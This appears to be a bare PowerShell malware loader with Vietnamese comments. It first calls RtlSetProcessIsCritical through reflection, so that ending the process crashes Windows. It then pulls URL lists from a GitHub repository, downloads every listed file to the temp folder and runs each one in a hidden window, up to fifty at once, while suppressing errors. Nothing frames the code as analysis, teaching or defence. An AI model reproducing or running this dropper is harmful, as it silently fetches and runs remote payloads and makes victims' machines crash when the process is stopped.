function CriticalProcess {
    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
    [System.Diagnostics.Process]::EnterDebugMode() 
    $domain = [AppDomain]::CurrentDomain
    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule('DynamicModule')
    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $type = $typeBuilder.CreateType()
    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
    function InvokeRtlSetProcessIsCritical {
        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
    }
    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
    }
    else {
        Write-Host "Unknown method name: $MethodName"
    }
}
CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
# Hợp nhất danh sách URL từ cả hai nguồn
$sources = @(
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
)

$allUrls = foreach ($s in $sources) {
    (Invoke-WebRequest -Uri $s -UseBasicParsing).Content -split "`n" | Where-Object { $_.Trim() -ne "" }
}

# Cấu hình số lượng luồng tối đa (5 tasks)
$maxThreads = 50
$jobs = @()

foreach ($u in $allUrls) {
    $u = $u.Trim()
    
    # Đợi nếu đã đủ 5 task đang chạy
    while (($jobs | Where-Object { $_.State -eq 'Running' }).Count -ge $maxThreads) {
        Start-Sleep -Milliseconds 500
    }

    # Bắt đầu một task mới
    $jobs += Start-Job -ScriptBlock {
        param($url)
        try {
            $fileName = [System.IO.Path]::GetFileName($url)
            $tempPath = Join-Path $env:TEMP $fileName
            
            # Tải xuống tệp
            Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing
            
            # Thực thi tệp (ẩn)
            Start-Process -FilePath $tempPath -WindowStyle Hidden
        } catch {
            # Ghi lỗi nếu cần thiết
        }
    } -ArgumentList $u
}

# Đợi tất cả hoàn thành
Wait-Job $jobs | Out-Null
